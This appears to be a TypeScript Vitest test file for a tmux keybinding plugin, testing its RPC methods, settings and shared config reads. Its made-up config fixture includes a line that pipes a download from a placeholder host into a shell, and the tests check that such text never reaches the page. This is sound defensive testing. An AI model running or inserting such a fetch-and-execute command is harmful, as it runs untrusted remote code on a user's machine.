import { homedir, userInfo } from "node:os";
import {
  createFakePluginHost,
  type FakePluginHarness,
} from "@get-bb/plugin-sdk/testing";
import { afterAll, afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import tmux from "./server";
import { CONFIG_FILE_STORAGE_KEY, FILE_LOOK_LIMIT_MS } from "./src/config-file";
import { listFolder, type FolderListing } from "./src/folder-listing";
import {
  CONFIG_FILE_CHANGED,
  CONFIG_FILE_LABEL,
  CONFIG_TEXT_NAME,
  DEFAULT_SETTINGS,
  ENABLED_LABEL,
  NUMBER_RANGES,
  parseSettings,
} from "./src/settings";
import { canReadConfigFile, readTmuxConfig } from "./src/tmux-config";
import {
  stockTmuxConfig,
  tmuxConfigFrom,
  type TmuxConfig,
} from "./src/tmux-keymap";
import { fileSources } from "./src/tmux-test-support";

// The reader is replaced, so no test here reads a tmux config of this machine,
// and so is the listing, so none lists a folder of it.
vi.mock("./src/tmux-config", () => ({
  readTmuxConfig: vi.fn(),
  canReadConfigFile: vi.fn(),
}));
vi.mock("./src/folder-listing", () => ({ listFolder: vi.fn() }));
// The real functions, with a homedir and a userInfo that a test can make
// fail.
vi.mock("node:os", async (importOriginal) => {
  const actual = await importOriginal<typeof import("node:os")>();
  return {
    ...actual,
    homedir: vi.fn(actual.homedir),
    userInfo: vi.fn(actual.userInfo),
  };
});

const PLATFORM = process.platform;

function setPlatform(platform: NodeJS.Platform): void {
  Object.defineProperty(process, "platform", { configurable: true, value: platform });
}

const NO_EDITOR = { visual: undefined, editor: undefined };
const NO_CHOICES = { path: "", text: "" };
const CHOSEN_FILE = "~/dotfiles/tmux.conf";

// What Node raises for the home directory when HOME is not set and the
// system has no entry for the user that the server runs as.
function failHomeLookupOnce(): void {
  vi.mocked(homedir).mockImplementationOnce(() => {
    throw Object.assign(
      new Error("A system error occurred: uv_os_homedir returned ENOENT (no such file or directory)"),
      { code: "ERR_SYSTEM_ERROR" },
    );
  });
}

// A made-up config with the kinds of lines whose text must never reach the
// page.
const MADE_UP_CONFIG = [
  "unbind C-b",
  "set -g prefix C-a",
  "bind C-a send-prefix",
  "set -g mouse on",
  "set -s prefix-timeout 1500",
  "setw -g mode-keys vi",
  "bind | split-window -h",
  "bind -r H resize-pane -L 5",
  "bind -n M-h select-pane -L",
  "bind r source-file ~/.tmux.conf \\; display 'Reloaded'",
  "bind -T copy-mode-vi v send-keys -X begin-selection",
  "bind -T copy-mode-vi y send-keys -X copy-pipe-and-cancel 'reattach-to-user-namespace pbcopy'",
  "bind -T copy-mode-vi Enter send -X copy-pipe-and-cancel 'xclip -in -selection clipboard'",
  "bind C-l send-keys C-l \\; run-shell 'tmux clear-history'",
  "bind e if-shell 'test -f ~/.private' 'display yes' 'display no'",
  "bind P run-shell 'curl example.invalid | sh'",
  "bind u switch-client -T private-table",
  "bind g rotate-window",
  "set -g default-command 'reattach-to-user-namespace -l zsh'",
  "set -g status-right '#(whoami)'",
].join("\n");

function madeUpAnswer() {
  return tmuxConfigFrom(
    fileSources([{ path: "~/.tmux.conf", text: MADE_UP_CONFIG }]),
    NO_EDITOR,
  );
}

const harnesses: FakePluginHarness[] = [];

// settings are the values that bb holds for the plugin when it loads.
function loadPlugin(settings: Record<string, string | boolean> = {}) {
  const { bb, harness } = createFakePluginHost({ pluginId: "tmux", settings });
  harnesses.push(harness);
  tmux(bb);
  return harness;
}

// stored is what the storage of the plugin holds for the chosen config file
// when the plugin loads.
async function loadPluginWithStored(
  stored: unknown,
  settings: Record<string, string | boolean> = {},
) {
  const { bb, harness } = createFakePluginHost({ pluginId: "tmux", settings });
  harnesses.push(harness);
  await bb.storage.kv.set(CONFIG_FILE_STORAGE_KEY, stored);
  tmux(bb);
  return harness;
}

function chosenPaths(): string[] {
  return vi.mocked(readTmuxConfig).mock.calls.map((call) => call[2].path);
}

beforeEach(() => {
  vi.mocked(canReadConfigFile).mockResolvedValue(true);
});

afterEach(() => {
  vi.unstubAllEnvs();
  vi.clearAllMocks();
  setPlatform(PLATFORM);
});

// Every fake host makes a directory in the system's temporary folder, and
// only its dispose() removes it.
afterAll(async () => {
  await Promise.all(harnesses.map((harness) => harness.dispose()));
});

describe("tmuxConfig rpc method", () => {
  it("is one of four methods, and nothing is read or listed while the plugin loads", () => {
    const harness = loadPlugin();

    expect(harness.registrations.rpcMethods).toEqual([
      "tmuxConfig",
      "listFolder",
      "configFile",
      "setConfigFile",
    ]);
    expect(readTmuxConfig).not.toHaveBeenCalled();
    expect(canReadConfigFile).not.toHaveBeenCalled();
    expect(listFolder).not.toHaveBeenCalled();
  });

  it("reads with the home directory, the XDG_CONFIG_HOME, the VISUAL and the EDITOR of the server", async () => {
    vi.stubEnv("XDG_CONFIG_HOME", "/somewhere/xdg");
    vi.stubEnv("VISUAL", "code --wait");
    vi.stubEnv("EDITOR", "vim");
    vi.mocked(readTmuxConfig).mockResolvedValue(stockTmuxConfig());
    const harness = loadPlugin();

    await harness.callRpc("tmuxConfig", null);

    expect(readTmuxConfig).toHaveBeenCalledWith(
      { homeDir: homedir(), xdgConfigHome: "/somewhere/xdg" },
      { visual: "code --wait", editor: "vim" },
      NO_CHOICES,
    );
  });

  it("reads without an editor when VISUAL and EDITOR are not set", async () => {
    vi.stubEnv("XDG_CONFIG_HOME", undefined);
    vi.stubEnv("VISUAL", undefined);
    vi.stubEnv("EDITOR", undefined);
    vi.mocked(readTmuxConfig).mockResolvedValue(stockTmuxConfig());
    const harness = loadPlugin();

    await harness.callRpc("tmuxConfig", null);

    expect(readTmuxConfig).toHaveBeenCalledWith(
      { homeDir: homedir(), xdgConfigHome: undefined },
      NO_EDITOR,
      NO_CHOICES,
    );
  });

  it("asks the system for the home directory when HOME is set to nothing, as tmux does", async () => {
    vi.stubEnv("HOME", "");
    vi.mocked(readTmuxConfig).mockResolvedValue(stockTmuxConfig());
    const harness = loadPlugin();

    await harness.callRpc("tmuxConfig", null);

    expect(homedir()).toBe("");
    expect(userInfo().homedir).not.toBe("");
    expect(vi.mocked(readTmuxConfig).mock.calls[0][0]).toMatchObject({
      homeDir: userInfo().homedir,
    });
  });

  it("reads with no home directory when HOME is set to nothing and the system knows none", async () => {
    vi.stubEnv("HOME", "");
    vi.mocked(userInfo).mockImplementationOnce(() => {
      throw new Error("no entry for this user");
    });
    vi.mocked(readTmuxConfig).mockResolvedValue(stockTmuxConfig());
    const harness = loadPlugin();

    await harness.callRpc("tmuxConfig", null);

    expect(vi.mocked(readTmuxConfig).mock.calls[0][0]).toMatchObject({ homeDir: null });
  });

  it("reads with no home directory, and does not fail the call, when the system fails to say where it is", async () => {
    vi.mocked(readTmuxConfig).mockResolvedValue(stockTmuxConfig());
    const harness = loadPlugin();
    failHomeLookupOnce();

    expect(await harness.callRpc("tmuxConfig", null)).toEqual(stockTmuxConfig());
    expect(vi.mocked(readTmuxConfig).mock.calls[0][0]).toMatchObject({ homeDir: null });
  });

  it("hands on a Windows path in VISUAL and EDITOR with slashes, so that a folder name does not count as the editor", async () => {
    setPlatform("win32");
    vi.stubEnv("VISUAL", undefined);
    vi.stubEnv("EDITOR", "C:\\Users\\david\\Programs\\Code.exe");
    vi.mocked(readTmuxConfig).mockResolvedValue(stockTmuxConfig());
    const harness = loadPlugin();

    await harness.callRpc("tmuxConfig", null);

    expect(vi.mocked(readTmuxConfig).mock.calls[0][1]).toEqual({
      visual: undefined,
      editor: "C:/Users/david/Programs/Code.exe",
    });
  });

  it("leaves a backslash in VISUAL and EDITOR as it is on other systems, where a file name can hold one", async () => {
    setPlatform("linux");
    vi.stubEnv("VISUAL", "/opt/my\\vi/nano");
    vi.stubEnv("EDITOR", undefined);
    vi.mocked(readTmuxConfig).mockResolvedValue(stockTmuxConfig());
    const harness = loadPlugin();

    await harness.callRpc("tmuxConfig", null);

    expect(vi.mocked(readTmuxConfig).mock.calls[0][1]).toEqual({
      visual: "/opt/my\\vi/nano",
      editor: undefined,
    });
  });

  it("reads with the chosen config file as the storage of the plugin holds it, and with the Config text setting as bb holds it", async () => {
    vi.mocked(readTmuxConfig).mockResolvedValue(stockTmuxConfig());
    const harness = await loadPluginWithStored(CHOSEN_FILE, {
      tmuxConfigText: "bind -r H resize-pane -L 5\nbind -r L resize-pane -R 5\n",
    });

    await harness.callRpc("tmuxConfig", null);

    expect(vi.mocked(readTmuxConfig).mock.calls[0][2]).toEqual({
      path: CHOSEN_FILE,
      text: "bind -r H resize-pane -L 5\nbind -r L resize-pane -R 5\n",
    });
  });

  it("looks up the chosen file and the Config text setting again on every call", async () => {
    vi.mocked(readTmuxConfig).mockResolvedValue(stockTmuxConfig());
    const harness = loadPlugin();

    await harness.callRpc("tmuxConfig", null);
    await harness.callRpc("setConfigFile", { path: "/made/up/tmux.conf" });
    await harness.setSettings({ tmuxConfigText: "set -g mouse on" });
    await harness.callRpc("tmuxConfig", null);
    await harness.callRpc("setConfigFile", { path: null });
    await harness.callRpc("tmuxConfig", null);

    expect(vi.mocked(readTmuxConfig).mock.calls.map((call) => call[2])).toEqual([
      NO_CHOICES,
      { path: "/made/up/tmux.conf", text: "set -g mouse on" },
      { path: "", text: "set -g mouse on" },
    ]);
  });

  it.each([
    ["a number", 5],
    ["a list", ["~/dotfiles/tmux.conf"]],
    ["nothing but blanks", "   "],
    ["an object", { path: "~/dotfiles/tmux.conf" }],
  ])("reads tmux's usual files when the storage holds %s in the place of a path", async (_what, stored) => {
    vi.mocked(readTmuxConfig).mockResolvedValue(stockTmuxConfig());
    const harness = await loadPluginWithStored(stored);

    await harness.callRpc("tmuxConfig", null);

    expect(chosenPaths()).toEqual([""]);
    expect(await harness.callRpc("configFile", null)).toEqual({ file: null });
  });

  it("answers also while the plugin is switched off, because the page decides whether to ask", async () => {
    vi.mocked(readTmuxConfig).mockResolvedValue(stockTmuxConfig());
    const harness = loadPlugin({ enabled: false });

    expect(await harness.callRpc("tmuxConfig", null)).toEqual(stockTmuxConfig());
  });

  it("answers with stock tmux as the keymap builds it", async () => {
    vi.mocked(readTmuxConfig).mockResolvedValue(stockTmuxConfig());
    const harness = loadPlugin();

    expect(await harness.callRpc("tmuxConfig", null)).toEqual(stockTmuxConfig());
  });

  it("answers with the keymap of a config, whole", async () => {
    vi.mocked(readTmuxConfig).mockResolvedValue(madeUpAnswer());
    const harness = loadPlugin();

    const answer = await harness.callRpc("tmuxConfig", null);

    expect(answer).toEqual(madeUpAnswer());
    expect(answer).toMatchObject({
      options: {
        prefix: { key: "C-a", path: "~/.tmux.conf", usable: true },
        prefix2: null,
        modeKeys: "vi",
        mouse: true,
        repeatTimeMs: 500,
        prefixTimeoutMs: 1500,
        baseIndex: 0,
      },
      tables: {
        root: [
          {
            key: "M-h",
            repeat: false,
            actions: [{ type: "pane.focus", direction: "left" }],
          },
        ],
        prefix: expect.arrayContaining([
          { key: "g", repeat: false, actions: [] },
        ]),
      },
      files: ["~/.tmux.conf"],
      unreadable: false,
      namedFile: false,
      pastedText: "none",
    });
  });

  it("hands the page the key, the repeat mark and the actions of every binding, and not how the config writes the key", async () => {
    vi.mocked(readTmuxConfig).mockResolvedValue(madeUpAnswer());
    const harness = loadPlugin();

    const answer = (await harness.callRpc("tmuxConfig", null)) as TmuxConfig;
    const bindings = Object.values(answer.tables).flat();

    expect(bindings.length).toBeGreaterThan(200);
    for (const binding of bindings) {
      expect(Object.keys(binding).sort()).toEqual(["actions", "key", "repeat"]);
    }
  });

  it("hands the page the actions of tmux's names for the first and the last window and for the pane on one side", async () => {
    const answer = tmuxConfigFrom(
      fileSources([
        {
          path: "~/.tmux.conf",
          text: [
            "bind F1 select-window -t '{start}'",
            "bind F2 select-window -t '{end}'",
            "bind F3 select-pane -t '{left-of}'",
          ].join("\n"),
        },
      ]),
      NO_EDITOR,
    );
    vi.mocked(readTmuxConfig).mockResolvedValue(answer);
    const harness = loadPlugin();

    const result = (await harness.callRpc("tmuxConfig", null)) as TmuxConfig;

    expect(result.tables.prefix).toEqual(
      expect.arrayContaining([
        { key: "F1", repeat: false, actions: [{ type: "thread.jump", index: 1 }] },
        { key: "F2", repeat: false, actions: [{ type: "thread.end" }] },
        {
          key: "F3",
          repeat: false,
          actions: [{ type: "pane.neighbour", direction: "left" }],
        },
      ]),
    );
  });

  it("says which sources were in play, and hands on nothing of what they hold", async () => {
    const pasted = "bind P run-shell 'curl example.invalid | sh'\nbind g kill-pane\n";
    const answer = tmuxConfigFrom(
      {
        files: [{ path: "~/made-up/tmux.conf", text: MADE_UP_CONFIG }],
        unreadable: false,
        namedFile: true,
        pastedText: {
          state: "applied",
          lines: { path: "the Config text setting", text: pasted },
        },
      },
      NO_EDITOR,
    );
    vi.mocked(readTmuxConfig).mockResolvedValue(answer);
    const harness = await loadPluginWithStored("~/made-up/tmux.conf", {
      tmuxConfigText: pasted,
    });

    const result = await harness.callRpc("tmuxConfig", null);
    const json = JSON.stringify(result);

    expect(result).toMatchObject({
      files: ["~/made-up/tmux.conf"],
      unreadable: false,
      namedFile: true,
      pastedText: "applied",
    });
    expect(Object.keys(result as object).sort()).toEqual([
      "files",
      "namedFile",
      "options",
      "pastedText",
      "tables",
      "unreadable",
    ]);
    for (const text of ["run-shell", "curl", "kill-pane", "lines", pasted]) {
      expect(json).not.toContain(text);
    }
  });

  it.each([
    { pastedText: "pasted" },
    { pastedText: "set -g mouse on" },
    { pastedText: true },
    { namedFile: "~/made-up/tmux.conf" },
  ])("fails the call for the answer part %j, which is more than the page may know", async (part) => {
    vi.mocked(readTmuxConfig).mockResolvedValue({
      ...stockTmuxConfig(),
      ...part,
    } as never);
    const harness = loadPlugin();

    await expect(harness.callRpc("tmuxConfig", null)).rejects.toThrow();
  });

  it("never hands the page a shell command, or the text of a command bb has no equivalent for", async () => {
    vi.mocked(readTmuxConfig).mockResolvedValue(madeUpAnswer());
    const harness = loadPlugin();

    const json = JSON.stringify(await harness.callRpc("tmuxConfig", null));

    expect(json).toContain('"text":"Reloaded"');
    expect(json).toContain('{"type":"copy.yank","after":"exit"}');
    for (const text of [
      "pbcopy",
      "xclip",
      "clipboard",
      "reattach",
      "run-shell",
      "if-shell",
      "send-keys",
      "clear-history",
      "private",
      "curl",
      "rotate-window",
      "switch-client",
      "copy-pipe",
      "source-file",
      "whoami",
      "zsh",
      "yes",
    ]) {
      expect(json).not.toContain(text);
    }
  });

  it("hands the page nothing that the reader adds to the answer", async () => {
    const stock = stockTmuxConfig();
    const [first, ...others] = stock.tables.prefix;
    const withMore = {
      ...stock,
      text: "set -g prefix C-a",
      options: { ...stock.options, statusRight: "#(whoami)" },
      tables: {
        ...stock.tables,
        prefix: [{ ...first, note: "Send the prefix", command: "send-prefix" }, ...others],
        resize: [first],
      },
    };
    vi.mocked(readTmuxConfig).mockResolvedValue(withMore);
    const harness = loadPlugin();

    expect(await harness.callRpc("tmuxConfig", null)).toEqual(stock);
  });

  it.each([
    { type: "shell.run", command: "true" },
    { type: "pane.focus", direction: "sideways" },
    { type: "pane.resize", direction: "left", cells: 0 },
    { type: "pane.resize", direction: "left" },
    { type: "thread.jump", index: 0 },
    { type: "copy.yank" },
    { type: "copy.toggleSelection" },
    { type: "window.select", window: 1 },
  ])("fails the call for the action %j, which is none the page knows", async (action) => {
    const stock = stockTmuxConfig();
    const [first] = stock.tables.prefix;
    const broken = {
      ...stock,
      tables: { ...stock.tables, prefix: [{ ...first, actions: [action] }] },
    };
    vi.mocked(readTmuxConfig).mockResolvedValue(broken as never);
    const harness = loadPlugin();

    await expect(harness.callRpc("tmuxConfig", null)).rejects.toThrow();
  });

  it("reads the config again on every call", async () => {
    vi.mocked(readTmuxConfig)
      .mockResolvedValueOnce(madeUpAnswer())
      .mockResolvedValueOnce(stockTmuxConfig());
    const harness = loadPlugin();

    expect(await harness.callRpc("tmuxConfig", null)).toEqual(madeUpAnswer());
    expect(await harness.callRpc("tmuxConfig", null)).toEqual(stockTmuxConfig());
    expect(readTmuxConfig).toHaveBeenCalledTimes(2);
  });

  describe("while a read is under way", () => {
    // A read that only ends when the test hands it its answer, or fails it.
    function slowRead() {
      const ends: {
        answer: (config: TmuxConfig) => void;
        fail: (error: Error) => void;
      }[] = [];
      const read = () =>
        new Promise<TmuxConfig>((answer, fail) => {
          ends.push({ answer, fail });
        });
      return { ends, read };
    }

    // The fake host hands a call on without waiting for anything outside
    // the process, so after one task every call made so far has reached
    // the reader.
    function callsHaveArrived(): Promise<void> {
      return new Promise((resolve) => setTimeout(resolve, 0));
    }

    afterEach(() => {
      vi.mocked(readTmuxConfig).mockReset();
    });

    it("lets two calls share that read, and reads afresh for a call after it has ended", async () => {
      const { ends, read } = slowRead();
      vi.mocked(readTmuxConfig).mockImplementation(read);
      const harness = loadPlugin();

      const first = harness.callRpc("tmuxConfig", null);
      const second = harness.callRpc("tmuxConfig", null);
      await callsHaveArrived();

      expect(readTmuxConfig).toHaveBeenCalledTimes(1);

      ends[0].answer(madeUpAnswer());

      expect(await first).toEqual(madeUpAnswer());
      expect(await second).toEqual(madeUpAnswer());
      expect(readTmuxConfig).toHaveBeenCalledTimes(1);

      const third = harness.callRpc("tmuxConfig", null);
      await callsHaveArrived();

      expect(readTmuxConfig).toHaveBeenCalledTimes(2);

      ends[1].answer(stockTmuxConfig());

      expect(await third).toEqual(stockTmuxConfig());
    });

    it("shares it among any number of calls with the same choices, so that the reader is asked once", async () => {
      const { ends, read } = slowRead();
      vi.mocked(readTmuxConfig).mockImplementation(read);
      const harness = await loadPluginWithStored("/mount/that/hangs/tmux.conf");
      const calls: Promise<unknown>[] = [];

      for (let call = 0; call < 20; call += 1) {
        calls.push(harness.callRpc("tmuxConfig", null));
        await callsHaveArrived();
      }

      expect(readTmuxConfig).toHaveBeenCalledTimes(1);

      ends[0].answer(stockTmuxConfig());

      expect(await Promise.all(calls)).toEqual(calls.map(() => stockTmuxConfig()));
      expect(readTmuxConfig).toHaveBeenCalledTimes(1);
    });

    it.each<[string, { file?: string | null; text?: string }]>([
      ["another chosen file", { file: "/made/up/tmux.conf" }],
      ["another Config text", { text: "set -g mouse on" }],
      ["no chosen file and its path as the Config text", { file: null, text: CHOSEN_FILE }],
    ])("asks the reader anew for a call with %s, and the reader shares the read of a file by its path", async (_what, changed) => {
      const { ends, read } = slowRead();
      vi.mocked(readTmuxConfig).mockImplementation(read);
      const harness = await loadPluginWithStored(CHOSEN_FILE);

      const first = harness.callRpc("tmuxConfig", null);
      await callsHaveArrived();
      if (changed.file !== undefined) {
        await harness.callRpc("setConfigFile", { path: changed.file });
      }
      if (changed.text !== undefined) {
        await harness.setSettings({ tmuxConfigText: changed.text });
      }
      const second = harness.callRpc("tmuxConfig", null);
      const third = harness.callRpc("tmuxConfig", null);
      await callsHaveArrived();

      expect(readTmuxConfig).toHaveBeenCalledTimes(2);
      const [before, after] = vi.mocked(readTmuxConfig).mock.calls.map((call) => call[2]);
      expect(before).toEqual({ path: "~/dotfiles/tmux.conf", text: "" });
      expect(after).not.toEqual(before);

      ends[1].answer(madeUpAnswer());
      ends[0].answer(stockTmuxConfig());

      expect(await first).toEqual(stockTmuxConfig());
      expect(await second).toEqual(madeUpAnswer());
      expect(await third).toEqual(madeUpAnswer());
    });

    it("fails every call that shares a read that fails, and reads afresh for the next call", async () => {
      const { ends, read } = slowRead();
      vi.mocked(readTmuxConfig).mockImplementation(read);
      const harness = loadPlugin();

      const first = harness.callRpc("tmuxConfig", null);
      const second = harness.callRpc("tmuxConfig", null);
      const failures = Promise.all([
        expect(first).rejects.toThrow(),
        expect(second).rejects.toThrow(),
      ]);
      await callsHaveArrived();
      ends[0].fail(new Error("disk on fire"));
      await failures;

      expect(readTmuxConfig).toHaveBeenCalledTimes(1);

      const third = harness.callRpc("tmuxConfig", null);
      await callsHaveArrived();
      ends[1].answer(stockTmuxConfig());

      expect(await third).toEqual(stockTmuxConfig());
      expect(readTmuxConfig).toHaveBeenCalledTimes(2);
    });
  });

  it("says that a config file could not be read", async () => {
    vi.mocked(readTmuxConfig).mockResolvedValue(
      tmuxConfigFrom(fileSources([], true), NO_EDITOR),
    );
    const harness = loadPlugin();

    expect(await harness.callRpc("tmuxConfig", null)).toMatchObject({
      files: [],
      unreadable: true,
    });
  });

  it("says that the chosen file and the pasted text could not be read", async () => {
    vi.mocked(readTmuxConfig).mockResolvedValue(
      tmuxConfigFrom(
        {
          files: [],
          unreadable: true,
          namedFile: true,
          pastedText: { state: "unreadable" },
        },
        NO_EDITOR,
      ),
    );
    const harness = loadPlugin();

    expect(await harness.callRpc("tmuxConfig", null)).toEqual({
      ...stockTmuxConfig(),
      unreadable: true,
      namedFile: true,
      pastedText: "unreadable",
    });
  });

  it("fails the call when the reader fails", async () => {
    vi.mocked(readTmuxConfig).mockRejectedValue(new Error("disk on fire"));
    const harness = loadPlugin();

    await expect(harness.callRpc("tmuxConfig", null)).rejects.toThrow();
  });
});

describe("settings", () => {
  const descriptors = loadPlugin().registrations.settingsDescriptors;
  const texts = Object.values(descriptors).map(
    (descriptor) => `${descriptor.label}\n${descriptor.description ?? ""}`,
  );

  it("defines the settings in this order", () => {
    expect(Object.keys(descriptors)).toEqual([
      "enabled",
      "tmuxConfigText",
      "threadOrder",
      "scrollStepPx",
      "copyOnSelect",
      "resizeCellPx",
    ]);
  });

  it("defines a setting for every key of the parsed settings, and no other", () => {
    expect(Object.keys(descriptors).sort()).toEqual(
      Object.keys(DEFAULT_SETTINGS).sort(),
    );
  });

  it("defines no setting for the prefix, which the tmux config alone decides", () => {
    expect(descriptors).not.toHaveProperty("prefixKey");
    expect(DEFAULT_SETTINGS).not.toHaveProperty("prefixKey");
    for (const descriptor of Object.values(descriptors)) {
      expect(descriptor.label).not.toMatch(/prefix/i);
    }
  });

  it("goes by no prefixKey value that bb still has stored: bb does not take one, and the tmux config is read as without it", async () => {
    vi.mocked(readTmuxConfig).mockResolvedValue(madeUpAnswer());
    const config = { tmuxConfigText: "set -g prefix C-s" };
    const plain = loadPlugin(config);
    const withStoredValue = loadPlugin({ ...config, prefixKey: "ctrl+x" });

    const answer = await withStoredValue.callRpc("tmuxConfig", null);

    expect(Object.keys(withStoredValue.registrations.settingsDescriptors)).toEqual(
      Object.keys(plain.registrations.settingsDescriptors),
    );
    expect(answer).toEqual(await plain.callRpc("tmuxConfig", null));
    expect(answer).toEqual(madeUpAnswer());
    const [stored, withoutIt] = vi.mocked(readTmuxConfig).mock.calls;
    expect(stored).toEqual(withoutIt);
    expect(stored[2]).toEqual({ path: "", text: "set -g prefix C-s" });
    await expect(
      withStoredValue.setSettings({ prefixKey: "ctrl+x" }),
    ).rejects.toThrow();
  });

  it("takes every default from the parsed settings", () => {
    const defaults = Object.fromEntries(
      Object.entries(descriptors).map(([key, descriptor]) => [
        key,
        descriptor.default,
      ]),
    );
    expect(defaults).toEqual(DEFAULT_SETTINGS);
  });

  it("names no key but those of the example line of the Config text setting", () => {
    for (const text of texts) {
      expect(text).not.toMatch(/h\/j\/k\/l|Option\+|Ctrl\+[a-z]\b|\b[jk] and [jk]\b|n\/p|1-9/);
    }
  });

  it("never uses an em dash", () => {
    for (const text of texts) {
      expect(text).not.toContain(String.fromCharCode(0x2014));
    }
  });

  it("is off until a person turns it on, and says that no key is handled until then", () => {
    expect(DEFAULT_SETTINGS.enabled).toBe(false);
    expect(descriptors.enabled).toMatchObject({
      type: "boolean",
      label: "Enable tmux keys",
      default: false,
    });
    expect(descriptors.enabled.description).toBe(
      "The plugin handles no key, and copies nothing when you select text with the mouse, until you turn this on.",
    );
  });

  it("defines no setting for the config file, which is chosen in the settings section of the plugin", () => {
    expect(descriptors).not.toHaveProperty("tmuxConfigPath");
    expect(DEFAULT_SETTINGS).not.toHaveProperty("tmuxConfigPath");
    for (const descriptor of Object.values(descriptors)) {
      expect(descriptor.label).not.toBe(CONFIG_FILE_LABEL);
    }
  });

  it("goes by no tmuxConfigPath value that bb still has stored: bb does not take one, and tmux's usual files are read as without it", async () => {
    vi.mocked(readTmuxConfig).mockResolvedValue(madeUpAnswer());
    const plain = loadPlugin();
    const withStoredValue = loadPlugin({ tmuxConfigPath: "~/old/tmux.conf" });

    const answer = await withStoredValue.callRpc("tmuxConfig", null);

    expect(Object.keys(withStoredValue.registrations.settingsDescriptors)).toEqual(
      Object.keys(plain.registrations.settingsDescriptors),
    );
    expect(answer).toEqual(await plain.callRpc("tmuxConfig", null));
    expect(chosenPaths()).toEqual(["", ""]);
    expect(await withStoredValue.callRpc("configFile", null)).toEqual({ file: null });
    await expect(
      withStoredValue.setSettings({ tmuxConfigPath: "~/old/tmux.conf" }),
    ).rejects.toThrow();
  });

  it("takes config lines in a box of several lines", () => {
    const { tmuxConfigText } = descriptors;

    expect(tmuxConfigText).toMatchObject({
      type: "string",
      label: "Config text",
      experimental_multiline: true,
      default: "",
    });
    expect(tmuxConfigText).not.toHaveProperty("secret");
  });

  it("says of the config lines first that they are applied on top of the config file, then what they are for, then that nothing is run, and gives one example line", () => {
    expect(descriptors.tmuxConfigText.description).toBe(
      "These lines of tmux config are applied on top of whatever is in the config file (the one chosen under Config file below, or tmux's usual files), so a line here wins over the same setting or key there. Use it when the machine that runs the bb server does not have your tmux config, or for lines that you want in bb only. Nothing in it is ever run. Example: bind -r H resize-pane -L 5",
    );
  });

  it("names the Config text setting and the Enable setting in the key help and the notices by their labels, and the section of the config file by its title", () => {
    expect(CONFIG_TEXT_NAME).toBe(
      `the ${descriptors.tmuxConfigText.label} setting`,
    );
    expect(ENABLED_LABEL).toBe(descriptors.enabled.label);
    expect(CONFIG_FILE_LABEL).toBe("Config file");
    expect(descriptors.tmuxConfigText.description).toContain(
      `chosen under ${CONFIG_FILE_LABEL} below`,
    );
  });

  it("says what the scroll step is for, in tmux's words and not in keys", () => {
    expect(descriptors.scrollStepPx.description).toBe(
      "How far one scroll step of copy mode (tmux's scroll-up and scroll-down) moves the conversation, and how far one line step scrolls the key help. 10 to 2000. A value outside that counts as the nearest allowed one.",
    );
  });

  it("names the thread order after the commands that follow it", () => {
    expect(descriptors.threadOrder.label).toBe("Thread order for tmux's window keys");
  });

  it("says that the recent order puts running threads first", () => {
    expect(descriptors.threadOrder.description).toBe(
      "The order that the keys for a window number, the next window and the previous window go through the threads in. Sidebar order follows the thread list as shown. Recent order puts running threads first, then the thread with the latest activity.",
    );
  });

  it("offers copy on select as a choice that follows tmux's mouse option by default", () => {
    expect(descriptors.copyOnSelect).toMatchObject({
      type: "select",
      options: ["auto", "on", "off"],
      default: "auto",
    });
    expect(descriptors.copyOnSelect.description).toContain(
      "when your tmux config turns the mouse option on",
    );
  });

  it("says what a cell of a resize is worth", () => {
    expect(descriptors.resizeCellPx).toMatchObject({ type: "number", default: 10 });
    expect(descriptors.resizeCellPx.description).toBe(
      "How many pixels one cell of tmux's resize-pane is worth. tmux resizes by terminal cells, and bb's panes are measured in pixels. 1 to 100. A value outside that counts as the nearest allowed one.",
    );
  });

  it("names the range of every number setting, because bb stores and shows a number as it was entered", () => {
    const numbers = Object.entries(descriptors).filter(
      ([, descriptor]) => descriptor.type === "number",
    );

    expect(numbers.map(([key]) => key).sort()).toEqual(Object.keys(NUMBER_RANGES).sort());
    for (const [key, descriptor] of numbers) {
      const { min, max } = NUMBER_RANGES[key as keyof typeof NUMBER_RANGES];
      expect(descriptor.description).toContain(`${min} to ${max}.`);
      expect(parseSettings({ [key]: min - 1 })).toMatchObject({ [key]: min });
      expect(parseSettings({ [key]: max + 1 })).toMatchObject({ [key]: max });
    }
  });
});

describe("configFile and setConfigFile rpc methods", () => {
  it("answers that no file is chosen for a plugin that was never told one, and looks at no file for that", async () => {
    const harness = loadPlugin();

    expect(await harness.callRpc("configFile", null)).toEqual({ file: null });
    expect(canReadConfigFile).not.toHaveBeenCalled();
  });

  it("stores the path as it was given, answers with it and with whether the file can be read now", async () => {
    const harness = loadPlugin();

    const change = await harness.callRpc("setConfigFile", { path: CHOSEN_FILE });

    expect(change).toEqual({
      ok: true,
      file: { path: CHOSEN_FILE, readable: true },
    });
    expect(await harness.callRpc("configFile", null)).toEqual({
      file: { path: CHOSEN_FILE, readable: true },
    });
    expect(vi.mocked(canReadConfigFile).mock.calls).toEqual([
      [CHOSEN_FILE, homedir()],
      [CHOSEN_FILE, homedir()],
    ]);
  });

  it("stores a file that cannot be read now all the same, and says that it cannot", async () => {
    vi.mocked(canReadConfigFile).mockResolvedValue(false);
    const harness = loadPlugin();

    expect(await harness.callRpc("setConfigFile", { path: "/made/up/gone.conf" })).toEqual({
      ok: true,
      file: { path: "/made/up/gone.conf", readable: false },
    });
    expect(await harness.callRpc("configFile", null)).toEqual({
      file: { path: "/made/up/gone.conf", readable: false },
    });
  });

  it("asks whether the file can be read again on every call", async () => {
    vi.mocked(canReadConfigFile).mockResolvedValueOnce(false).mockResolvedValueOnce(true);
    const harness = await loadPluginWithStored(CHOSEN_FILE);

    expect(await harness.callRpc("configFile", null)).toEqual({
      file: { path: CHOSEN_FILE, readable: false },
    });
    expect(await harness.callRpc("configFile", null)).toEqual({
      file: { path: CHOSEN_FILE, readable: true },
    });
  });

  it.each(["~/my dotfiles/../tmux.conf", "~/dotfiles/tmux.conf ", "/made/up/tmux.conf\t", "/made/up/Icon\r"])(
    "stores the path %j exactly as it was written, with a blank at its end, which can be part of a name",
    async (path) => {
      const { bb, harness } = createFakePluginHost({ pluginId: "tmux" });
      harnesses.push(harness);
      tmux(bb);

      expect(await harness.callRpc("setConfigFile", { path })).toEqual({
        ok: true,
        file: { path, readable: true },
      });
      expect(await bb.storage.kv.get(CONFIG_FILE_STORAGE_KEY)).toBe(path);
      expect(await harness.callRpc("configFile", null)).toEqual({
        file: { path, readable: true },
      });
      expect(vi.mocked(canReadConfigFile).mock.calls).toEqual([
        [path, homedir()],
        [path, homedir()],
      ]);
    },
  );

